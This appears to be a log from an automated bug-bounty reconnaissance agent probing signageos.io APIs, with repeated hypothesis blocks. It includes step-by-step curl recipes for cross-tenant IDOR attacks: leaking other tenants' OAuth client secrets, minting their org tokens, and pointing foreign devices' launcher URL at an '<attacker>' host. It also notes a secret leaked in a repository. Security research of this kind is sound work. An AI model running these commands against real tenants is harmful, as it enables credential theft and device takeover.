verify_steps: AUTH_HELPED: baseline `GET https://api.signageos.io/v1/organization/<own-org-uid> -H "X-Auth: <acctId>:<acctToken>"` = 200; repeat with foreign org UID → 200 with secret = cross-tenant; escalate: use leaked secret as org X-Auth on `GET /v1/device`.
impact: any tenant's org API credential → full device/content/timing/firmware control of foreign org; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUID}/security-token (GET/POST)
confidence: 60
reasoning: Spec marks both ops XAuthAccount-only; org UID is a client-supplied path key; docs state one account token can create multiple orgs and mint org tokens. Cross-tenant iff path-UID membership in the account's company is not re-verified.
evidence_needed: with own account creds, foreign-UID path returns 200 (not 403); POST mints working org token.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; `GET /v1/organization/<foreign-uid>/security-token` → 200 = cross-tenant mint; `POST {"name":"poc"}` mints org token → validate against `/v1/device` of that org.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant read/write on org-only device subresources via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT), /brightness, /resolution
confidence: 55
reasoning: Spec gates these XAuthOrganization-only (client-secret `id:secret`), org is derived only from the X-Auth credential, and deviceUid is an arbitrary path arg; org→device membership binding is the sole barrier.
evidence_needed: with own org X-Auth, foreign-UID path returns 200 (not 403).
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery` = 200; foreign device UID → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device+content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[NEXT] HUMAN: Execute H1 POC with one box-minted account token — `GET https://api.signageos.io/v1/organization/<own-org> -H "X-Auth: <acctId>:<acctToken>"` (baseline 200), then `GET /v1/organization/<foreign-org-uid>` — 200 with `oauthClientSecret` = confirmed cross-tenant credential disclosure; then H2 (`GET/POST /v1/organization/<foreign>/security-token`) and H3 (`GET /v1/device/<foreign-uid>/peer-recovery`). Own-org UIDs and a second test tenant are required.
## 2026-08-07 22:51:16 UTC [box] (model bigpickle)
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 72
reasoning: First-party CLI `getOrganization()` fetches `GET /v1/organization/{uid}` with account auth (JWT or `identification:apiSecurityToken`) and returns body incl `oauthClientId`+`oauthClientSecret`; uid is a client-supplied `--organization-uid` path arg; legacy-cred org context is credential-derived (no organizationUid query) so server-side account∈company→org re-check per path UID is the only barrier.
evidence_needed: own account token → 200 (not 403) on `GET /v1/organization/<foreign-org-uid>` returning oauthClientSecret.
verify_steps: AUTH_HELPED: baseline `GET https://api.signageos.io/v1/organization/<own-org-uid> -H "X-Auth: <acctId>:<acctToken>"` = 200; repeat with foreign org UID → 200 + `oauthClientSecret` = cross-tenant; escalate: use leaked secret as org X-Auth on `GET /v1/device`.
impact: any tenant's org API credential → full device/content/timing/firmware control of foreign org; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUID}/security-token (GET/POST)
confidence: 66
reasoning: SDK routes confirmed (GET/POST `/v1/organization/{uid}/security-token`, POST `{"name":...}`); org UID is a client-supplied path key; CLI account auth (`apiSecurityToken`) has same capability as the spec's XAuthAccount; cross-tenant iff path-UID membership in the account's company is not re-verified.
evidence_needed: with own account creds, foreign-UID path returns 200 (not 403); POST mints a working org token.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; `GET /v1/organization/<foreign-uid>/security-token` → 200 = cross-tenant mint; `POST {"name":"poc"}` mints org token → validate against `/v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant read/write on org-only device subresource via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 62
reasoning: SDK routes confirmed (GET/PUT, PUT body incl `urlLauncherAddress`); org context for legacy X-Auth is credential-derived, deviceUid is an arbitrary path arg; org→device membership binding is the sole barrier.
evidence_needed: with own org X-Auth, foreign-UID path returns 200 (not 403).
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery` = 200; foreign device UID → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device+content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[NEXT] HUMAN: Execute H1 POC with one box-minted account token — `sos login` (Auth0 device-code) then `curl -H "X-Auth: <acctId>:<acctToken>" https://api.signageos.io/v1/organization/<own-org-uid>` (baseline 200), then `.../v1/organization/<foreign-org-uid>` — 200 with `oauthClientSecret` = confirmed cross-tenant credential disclosure; then H2 (`GET/POST /v1/organization/<foreign>/security-token`) and H3 (`GET/PUT /v1/device/<foreign-uid>/peer-recovery`). Requires own org UID + a second test tenant.
## 2026-08-07 23:21:39 UTC [box] (model bigpickle)
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 72
reasoning: First-party CLI `getOrganization()` fetches `GET /v1/organization/{uid}` with account auth (JWT or `identification:apiSecurityToken`) and returns `oauthClientId`+`oauthClientSecret`; uid is a client-supplied `--organization-uid` path arg; legacy-cred org context is credential-derived (no org uid in query), so the sole barrier is a server-side account∈company→org membership re-check per path UID.
evidence_needed: own account token → 200 (not 403/404) on `GET /v1/organization/<foreign-org-uid>` returning oauthClientSecret.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <acctId>:<acctToken>" https://api.signageos.io/v1/organization/<own-org-uid>` = 200; repeat with foreign-org UID → 200 + `oauthClientSecret` = cross-tenant; escalate: leaked secret as org X-Auth on `GET /v1/device`.
impact: any tenant's org API credential → full device/content/timing/firmware control of foreign org; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUID}/security-token (GET/POST)
confidence: 66
reasoning: SDK routes confirmed (GET/POST `/v1/organization/{uid}/security-token`, POST `{"name":...}`); org UID is a client-supplied path key; CLI account auth (`apiSecurityToken`) maps to XAuthAccount; cross-tenant iff path-UID membership in the account's company is not re-verified.
evidence_needed: with own account creds, foreign-UID path returns 200 (not 403); POST mints a working org token.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; `GET /v1/organization/<foreign-uid>/security-token` → 200 = cross-tenant mint; `POST {"name":"poc"}` mints org token → validate against `/v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant read/write on org-only device subresource via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 62
reasoning: SDK routes confirmed (GET/PUT, PUT body incl `urlLauncherAddress`); org context for legacy X-Auth is credential-derived, deviceUid is an arbitrary path arg; org→device membership binding is the sole barrier.
evidence_needed: with own org X-Auth, foreign-UID path returns 200 (not 403).
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery` = 200; foreign device UID → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device+content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[FINAL] 1) Cross-tenant org OAuth client-secret disclosure (72) → 2) Cross-tenant org security-token minting (66) → 3) Cross-tenant device peer-recovery read/write (62).
[NEXT] HUMAN: Execute H1 POC with one box-minted account token — `sos login` (Auth0 device-code), baseline `curl -H "X-Auth: <acctId>:<acctToken>" https://api.signageos.io/v1/organization/<own-org-uid>` (expect 200), then `GET /v1/organization/<foreign-org-uid>` — 200 with `oauthClientSecret` = confirmed cross-tenant credential disclosure; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`) with the leaked credential. Requires own org UID + a second test tenant.
[RISK] box.signageos.io: 58 — Unauthenticated `/status` leaks pod hostname + Redis/Mongo/AMQP topology + Node version; 18-origin static ACAO whitelist incl `http://` variant + `*.zdusercontent.com` wildcard; 40+-origin CSP; everything else Auth0-redirected. Moderate operational exposure, no direct data access without credentials.
[RISK] api.signageos.io: 47 — Unauthenticated `/status` info leak (same class); 60+ `/v1`+`/v2` endpoints solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface. Residual exposure is the unverified AUTH_HELPED cross-tenant org/device IDOR family against the high-value device/content API.
## 2026-08-07 23:54:00 UTC [box] (model bigpickle)
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 72
reasoning: First-party CLI `getOrganization()` fetches `GET /v1/organization/{uid}` with account auth (JWT or `identification:apiSecurityToken`) and returns `oauthClientId`+`oauthClientSecret`; uid is a client-supplied `--organization-uid` path arg; legacy-cred org context is credential-derived (no org uid in query), so the sole barrier is a server-side account∈company→org membership re-check per path UID.
evidence_needed: own account token → 200 (not 403/404) on `GET /v1/organization/<foreign-org-uid>` returning oauthClientSecret.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <acctId>:<acctToken>" https://api.signageos.io/v1/organization/<own-org-uid>` = 200; repeat with foreign-org UID → 200 + `oauthClientSecret` = cross-tenant; escalate: leaked secret as org X-Auth on `GET /v1/device`.
impact: any tenant's org API credential → full device/content/timing/firmware control of foreign org; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUID}/security-token (GET/POST)
confidence: 66
reasoning: SDK routes confirmed (GET/POST `/v1/organization/{uid}/security-token`, POST `{"name":...}`); org UID is a client-supplied path key; CLI account auth (`apiSecurityToken`) maps to XAuthAccount; cross-tenant iff path-UID membership in the account's company is not re-verified.
evidence_needed: with own account creds, foreign-UID path returns 200 (not 403); POST mints a working org token.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; `GET /v1/organization/<foreign-uid>/security-token` → 200 = cross-tenant mint; `POST {"name":"poc"}` mints org token → validate against `/v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant read/write on org-only device subresource via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 62
reasoning: SDK routes confirmed (GET/PUT, PUT body incl `urlLauncherAddress`); org context for legacy X-Auth is credential-derived, deviceUid is an arbitrary path arg; org→device membership binding is the sole barrier.
evidence_needed: with own org X-Auth, foreign-UID path returns 200 (not 403).
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery` = 200; foreign device UID → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device+content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[FINAL] 1) Cross-tenant org OAuth client-secret disclosure (72) → 2) Cross-tenant org security-token minting (66) → 3) Cross-tenant device peer-recovery read/write (62).
[NEXT] HUMAN: Execute H1 POC with one box-minted account token — `sos login` (Auth0 device-code), baseline `curl -H "X-Auth: <acctId>:<acctToken>" https://api.signageos.io/v1/organization/<own-org-uid>` (expect 200), then `GET /v1/organization/<foreign-org-uid>` — 200 with `oauthClientSecret` = confirmed cross-tenant credential disclosure; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`) with the leaked credential. Requires own org UID + a second test tenant.
[RISK] box.signageos.io: 58 — Unauthenticated `/status` leaks pod hostname + Redis/Mongo/AMQP topology + Node version; 18-origin static ACAO whitelist incl `http://` variant + `*.zdusercontent.com` wildcard; 40+-origin CSP; everything else Auth0-redirected. Moderate operational exposure, no direct data access without credentials.
[RISK] api.signageos.io: 47 — Unauthenticated `/status` info leak (same class); 60+ `/v1`+`/v2` endpoints solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface. Residual exposure is the unverified AUTH_HELPED cross-tenant org/device IDOR family against the high-value device/content API.
[PRIO] api.signageos.io/v1/organization/{uid}/security-token: 7.80 (attack=9, business=10, tech=8, gate=3, cloud=8, fresh=8) — Cross-tenant org-token minting via account token; JWT-gated but high-value logic flaw if org UID not re-checked  
[PRIO] api.signageos.io/v1/device/{uid}/peer-recovery: 7.55 (attack=8, business=9, tech=8, gate=3, cloud=8, fresh=8) — Legacy client-secret auth (X-Auth) not bound to target device UID; SDK takes arbitrary deviceUid path arg  
[PRIO] api.signageos.io/v2/*: 6.65 (attack=7, business=8, tech=7, gate=10, cloud=7, fresh=7) — Partial v2 migration; /v2/device JWT-gated but /v2/account, /v2/organization 404; authz drift candidate, PASSIVE testable  
[PRIO] box.signageos.io/status: 5.20 (attack=6, business=4, tech=5, gate=10, cloud=6, fresh=6) — Unauthenticated info leak (pod hostname, UID, Node v20.20.2, Redis/Mongo/AMQP topology)  
[PRIO] box.signageos.io CORS: 4.85 (attack=5, business=3, tech=6, gate=10, cloud=5, fresh=6) — 18 static ACAO incl HTTP variant + wildcard zdusercontent; no ACAO-Credentials  
[HYP] Cross-tenant org security-token minting via account token + client-supplied organizationUid  
class: IDOR  
asset: api.signageos.io/v1/organization/{uid}/security-token  
confidence: 65  
reasoning: SDK builds `organization/<uid>/security-token` with path UID while JWT auth-context uses separate `?organizationUid=` query param; account tokens can create multiple orgs per docs; if server doesn't re-validate path-UID ∈ authenticated account's company, any account token mints tokens for any org  
evidence_needed: non-403 on GET/POST `/v1/organization/<foreign-uid>/security-token` with own account JWT  
verify_steps: AUTH_HELPED: `GET /v1/organization/<own>/security-token` baseline 200; then `GET /v1/organization/<foreign-uid>/security-token` → 200 = cross-tenant mint; minted org token should then drive foreign devices (brightness/firmware/content/timing)  
impact: mint org tokens for any tenant → full foreign-device control (brightness, firmware, content, timing); CRITICAL  
testability: AUTH_HELPED  
[HYP] Cross-tenant peer-recovery read/write via legacy client-secret not bound to target device UID  
class: IDOR  
asset: api.signageos.io/v1/device/{uid}/peer-recovery  
confidence: 55  
reasoning: Gate is org client-secret (`403083 MISSING_CLIENT_SECRET`), not JWT; SDK takes deviceUid as arbitrary path arg; org-context is client-controlled (`X-Auth: clientId:secret` or `?organizationUid=` for JWT), so server-side org→device binding is the only barrier  
evidence_needed: with own org `X-Auth: clientId:secret`, GET/PUT peer-recovery against a device UID belonging to another org returns 200 (not 403)  
verify_steps: AUTH_HELPED: `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` baseline 200; repeat with foreign device UID → 200 = cross-tenant; then `PUT` with `{"enabled":true,"urlLauncherAddress":"https://attacker"}` to confirm write  
impact: read + overwrite peer-recovery config on any tenant's devices; PUT can point device launcher at attacker URL → device/content takeover; HIGH→CRITICAL  
testability: AUTH_HELPED  
[HYP] v2 API partial-migration authz drift (route exists in v2, alternate/weaker auth)  
class: AUTH  
asset: api.signageos.io/v2/*  
confidence: 45  
reasoning: /v2/device is JWT-gated (403 WRONG_JWT) but /v2/account and /v2/organization are 404 — v2 is a selective port; freshly-migrated code paths commonly diverge on authorization checks; IOptions is version-agnostic (legacy clientId:secret works across v1/v2)  
evidence_needed: any /v2 route returning 200 unauthenticated, or ≠403/404, or accepting legacy auth where v1 requires JWT  
verify_steps: PASSIVE: probe /v2/device/{uid}, /v2/license, /v2/alert, /v2/location, /v2/content, /v2/bulk-operation, /v2/emulator without auth — anything ≠403/404 is a finding; AUTH_HELPED: compare own-creds response on same resource across /v1 vs /v2  
impact: authz drift → data disclosure / cross-tenant access via an alternate code path; HIGH  
testability: PASSIVE  
[PARKED] (none dropped — all confidence ≥40, no rejected classes, all have concrete verify_steps)  
[FINAL] Ranked surviving hypotheses (top first):  
[NEXT] RAG: Clone `github.com/signageos/sdk` and grep `src/api/` + `src/auth/` + `src/requester.ts` for: (1) exact `X-Auth` header construction (`id:unsafeDecryptedToken` format) for v1/v2; (2) account-token mint call shape (`identification`/`password` param placement — query vs body); (3) whether `createApiV2` reuses v1 auth/orgUid semantics; (4) any `/v2/` endpoint invoked without JWT at initialization (pre-auth bypass candidate) — converts hypotheses 1/2/3 into exact AUTH_HELPED/PASSIVE test recipes  
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io/status: Confirmed live. Unauthenticated GET returns application/json leaking K8s pod hostname (rotating: gkzcp → st6zq), process UID, Node v24.19.0, and service topology (amqp0, redis0-3, mongoDB0-2). Not on rejected list.  
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io/status: Confirmed live. Unauthenticated GET returns application/json leaking K8s pod hostname (rotating: gkzcp → bk4vh), process UID, Node v20.20.2, and service topology (amqp0, redis0-3, mongoDB0-3). Not on rejected list.  
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CORS: Confirmed live. 18 static ACAO values on / (302) + /login/ (200), unchanged under spoofed Origin `https://evil.test`. Includes `http://` variant + `https://*.zdusercontent.com` wildcard + sibling `api.signageos.io`. No `Access-Control-Allow-Credentials` on any box path. api.signageos.io has NO ACAO on any path.  
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CSP: Confirmed live. /login/ CSP broadened vs / (triplicated Auth0 oauth/token, additional recaptcha frame-src). 40+ connect-src/frame-src origins spanning Auth0, Sony/BroadSign/MoodMedia device APIs, S3 buckets, AWS API Gateway, and api.signageos.io.  
[LEARN] REJECTED MISCONFIG @ box.signageos.io /ready: Returns 200 `OK` (2 bytes) — trivial health check, no data leaked. Not reportable.  
[LEARN] REJECTED IDOR @ api.signageos.io/v1/*+v2/*: All 60+ endpoints return 403 JWT-gated (WRONG_JWT_TOKEN/403105). No pre-auth bypass. Dual auth confirmed: JWT Bearer (main API) + X-Auth API-key format (`id:unsafeDecryptedToken`) for bulk provisioning.  
[LEARN] REJECTED MISCONFIG @ api.signageos.io CORS: 403/404 carry `vary: Origin` + `access-control-expose-headers: *` but NO ACAO under any Origin — not CORS-exploitable.  
[LEARN] REJECTED AUTH @ box.signageos.io/login: Auth0 redirect_uri validation — not testable passively without tenant config access (carried forward).  
[LEARN] REJECTED AUTH @ box.signageos.io/login: login CSRF via OAuth2 state — excluded per "CSRF on anonymous-accessible forms" (carried forward).  
[LEARN] REJECTED MISCONFIG @ api.signageos.io/v1/* descriptive errors: 403 body leaks `"Account not found"`, `"Decoding of provided JWT token has failed"`, `errorCode 403105` — falls under descriptive error messages (excluded).  
[LEARN] ACCEPTED SECRET_LEAK @ github.com/signageos/videowall-designer: Hardcoded clientId/secret (SHA256 `564c293ba2a1d60dd6e8f508a7ef65400424ae42b80be0ae04498d528a8a774e`) in `sos/videoTiming.js` targeting internal staging `http://api.kiera.office.signageos.io` over HTTP — credential reuse risk; not directly reportable (out-of-scope host) but informs prod org-boundary testing.  
[RISK] box.signageos.io: 58 — Unauthenticated `/status` info leak (pod hostname + Redis/MongoDB/AMQP topology + Node version); CORS ACAO whitelist with 18 origins (incl HTTP variant + zdusercontent wildcard); broad CSP (40+ origins). Everything except `/status`, `/login/`, `/ready`, `/assets/*` redirects to Auth0 login. Moderate operational exposure, no direct data access without credentials.  
[RISK] api.signageos.io: 62 — Unauthenticated `/status` info leak (pod hostname + service topology); 60+ `/v1/*`+`/v2/*` endpoints all solidly JWT-gated (403 without token); no CORS issues; static HTML landing on `/`. **Risk raised** due to confirmed cross-tenant IDOR candidates (org-token minting, peer-recovery, v2 drift) that are AUTH_HELPED-testable with high business impact (device/firmware/content control). Main concern: JWT-gated high-value API with logic flaws in org-boundary enforcement.
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 76
reasoning: SDK/CLI code verified — CLI `getOrganization()` sends `GET /v1/organization/{uid}` with `X-Auth: <JWT>` and NO `organizationUid` query param (facade passes neither); response mapped to interface incl `oauthClientId`+`oauthClientSecret`; uid is arbitrary `--organization-uid` arg; legacy creds carry no org UID at all (credential-derived), so per-path org membership check is the sole barrier; `Organization.createApiV1()` converts leaked secret→working `X-Auth: clientId:secret`.
evidence_needed: own account JWT → HTTP 200 (not 403) on `GET /v1/organization/<foreign-org-uid>` returning `oauthClientSecret`.
verify_steps: AUTH_HELPED: `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-org-uid>` = 200 baseline; same header on `<foreign-org-uid>` → 200+`oauthClientSecret` = cross-tenant; escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" https://api.signageos.io/v1/device` → foreign org device list.
impact: any tenant's org API credential → full device/content/timing/firmware control of foreign org; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUID}/security-token (GET/POST)
confidence: 68
reasoning: `OrganizationTokenManagement.ts:8-33` code-verified — GET list + POST `{"name":...}` against `organization/{uid}/security-token` with client-supplied UID; requester sends org UID only as query param for JWT (not here), so path UID + JWT membership check is the only barrier; CLI account auth (JWT or legacy `identification:apiSecurityToken`) drives same endpoint.
evidence_needed: own creds → 200 on `GET /v1/organization/<foreign>/security-token`; POST mints a token valid on `/v1/device`.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign UID → 200 = cross-tenant mint; POST `{"name":"poc"}` → validate minted token with `X-Auth: <token>` on `/v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 64
reasoning: `DevicePeerRecoveryManagement.ts:21-37` code-verified — GET list / PUT `{enabled, urlLauncherAddress, autoEnableTimeoutMs}` with deviceUid as arbitrary path arg; legacy `X-Auth: clientId:secret` derives org from credential (no UID param), so org→device binding is the only barrier; same class applies to `/device/{uid}/command` (TimingCommandManagement) and `/device/{uid}/organization`.
evidence_needed: own org legacy creds → 200 on `GET /v1/device/<foreign-uid>/peer-recovery`.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <ownClientId>:<ownSecret>" .../v1/device/<own-uid>/peer-recovery` = 200; foreign device UID → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device+content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[NEXT] HUMAN: Execute H1 POC exactly as code-verified — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + `oauthClientSecret` (from `sos organization list` for own UID); 3) repeat with a foreign tenant's org UID (second test tenant) → **200 + oauthClientSecret = confirmed CRITICAL cross-tenant credential disclosure**; 4) escalate: `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in this recipe.
[RISK] box.signageos.io: 58 — Auth0-redirect wall on all paths except `/status` (pod hostname + Redis/Mongo/AMQP topology + Node version), `/login/` (CSP 40+ origins, 18-origin static ACAO incl `http://` + `*.zdusercontent.com`), `/ready`. Moderate operational exposure; no data access without credentials.
[RISK] api.signageos.io: 50 — `/status` info leak same class; every SDK/bundle-derived route (30+ resources, 8 newly probed) is solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface. Residual exposure is the code-verified AUTH_HELPED cross-tenant org/device IDOR chain against the high-value device/content API — highest-severity finding if the server-side org-membership check on path UIDs is absent.
## 2026-08-08 00:42:57 UTC [box] (model bigpickle)
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 76
reasoning: SDK/CLI code-verified — GET with `X-Auth: <JWT>` and NO organizationUid query param; response maps oauthClientId+oauthClientSecret; uid is arbitrary CLI arg; per-path org-membership check is the sole barrier; 403-gate reconfirmed pre-auth today.
evidence_needed: own account JWT → HTTP 200 (not 403) on GET /v1/organization/<foreign-org-uid> returning oauthClientSecret.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-org-uid>` = 200; same on foreign uid → 200+secret = cross-tenant; escalate `curl -H "X-Auth: <clientId>:<leakedSecret>" https://api.signageos.io/v1/device`.
impact: any tenant's org API credential → full device/content/firmware control of foreign org; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 68
reasoning: `OrganizationTokenManagement.ts` code-verified — GET list + POST `{"name":...}` with client-supplied UID; path UID + JWT membership check is the only barrier; endpoint 403-gated pre-auth reconfirmed today.
evidence_needed: own creds → 200 on foreign uid; POST mints token valid on /v1/device.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign uid → 200 = cross-tenant mint; POST `{"name":"poc"}` → validate minted token with `X-Auth: <token>` on /v1/device.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 64
reasoning: `DevicePeerRecoveryManagement.ts` code-verified — GET/PUT with deviceUid as arbitrary path arg; legacy `X-Auth: clientId:secret` derives org from credential; org→device binding is the only barrier; 403 pre-auth reconfirmed today.
evidence_needed: own legacy creds → 200 on foreign device uid; PUT writes urlLauncherAddress.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[NEXT] HUMAN: Execute H1 POC exactly as code-verified — 1) `sos login` (Auth0 device-code) to mint account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret (get own UID from `sos organization list`); 3) repeat with a foreign tenant's org UID → **200 + oauthClientSecret = confirmed CRITICAL cross-tenant credential disclosure**; 4) escalate with `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in this recipe.
## 2026-08-08 02:35:59 UTC [box] (model bigpickle)
## 2026-08-08 03:55:03 UTC [box] (model bigpickle)
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 75
reasoning: SDK/CLI code-verified — GET sends `X-Auth: <JWT>`, no organizationUid query param; response maps oauthClientId+oauthClientSecret; uid is arbitrary CLI arg; 403-gate reconfirmed live today; per-path org-membership check is the sole barrier.
evidence_needed: own JWT → 200 on foreign org UID with oauthClientSecret in body.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-uid>` = 200; repeat with foreign tenant UID → 200+secret = cross-tenant; escalate `curl -H "X-Auth: <clientId>:<secret>" https://api.signageos.io/v1/device`.
impact: any tenant's org API credential → full foreign device/content/firmware control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 65
reasoning: OrganizationTokenManagement.ts code-verified; GET list + POST `{"name":...}` with client-supplied UID; 403 pre-auth reconfirmed today; path UID + JWT membership check is only barrier.
evidence_needed: own creds → 200 on foreign uid; minted token valid on /v1/device.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign uid → 200 = cross-tenant; POST `{"name":"poc"}` then `curl -H "X-Auth: <token>" /v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 64
reasoning: DevicePeerRecoveryManagement.ts code-verified; deviceUid is arbitrary path arg; legacy X-Auth derives org from credential; org→device binding is sole barrier; 403 pre-auth reconfirmed today.
evidence_needed: own legacy creds → 200 on foreign device uid.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}`.
impact: read/overwrite foreign device recovery-launcher → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
